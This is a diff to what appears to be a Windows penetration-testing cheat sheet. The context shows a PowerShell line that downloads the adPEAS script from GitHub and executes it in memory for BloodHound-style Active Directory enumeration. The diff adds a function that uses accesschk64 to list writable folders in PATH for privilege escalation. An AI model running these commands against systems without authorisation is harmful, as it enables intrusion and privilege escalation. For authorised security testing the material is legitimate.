@@ -65,3 +65,30 @@ curityProtocolType]::Tls12
 IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/6110
 6960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS -Module Bloodhound -Scope All
 ~~~
+##### Check PATH of host and permissions on each folder in PATH (PowerShell function)
+~~~
+function Invoke-PathCheck {
+    param (
+        [string]$AccesschkPath = "C:\Path\to\accesschk64.exe"
+    )
+
+    # Controleer of accesschk64.exe bestaat
+    if (-Not (Test-Path $AccesschkPath)) {
+        Write-Host "accesschk64.exe not found at $AccesschkPath"
+        return
+    }
+
+    # Split de $Env:Path en controleer permissies voor elke map
+    $Env:Path -split ";" | ForEach-Object {
+        $path = $_.Trim()
+        if (-Not [string]::IsNullOrWhiteSpace($path)) {
+            Write-Host "Checking permissions for: $path"
+            & $AccesschkPath -wvud -accepteula $path
+            Write-Host "---------------------------"
+        }
+    }
+}
+
+# Roep de functie aan
+Invoke-PathCheck -AccesschkPath "C:\Path\to\accesschk64.exe"
+~~~
